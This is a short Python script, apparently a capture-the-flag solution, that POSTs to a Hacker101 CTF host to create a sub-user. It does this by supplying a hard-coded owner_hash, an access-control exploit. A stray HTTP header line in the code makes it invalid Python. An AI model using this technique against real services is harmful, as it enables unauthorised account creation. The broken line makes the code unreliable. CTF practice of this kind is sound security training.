import requests

URL = "https://e4e9643779e5fa738c90b0ac457a4fbd.ctf.hacker101.com"
EXTENSION = "/dashboard/subusers"
Content-Type: application/x-www-form-urlencoded

data = {
    "owner_hash": "cf505baebbaf25a0a4c63eb93331eb36",
    "new_username": "testtest",
    "new_password": "testtest",
}

request = requests.post(URL + EXTENSION, data=data)
status_code = request.status_code
response = request.content.decode("utf-8")
print("response: ", response)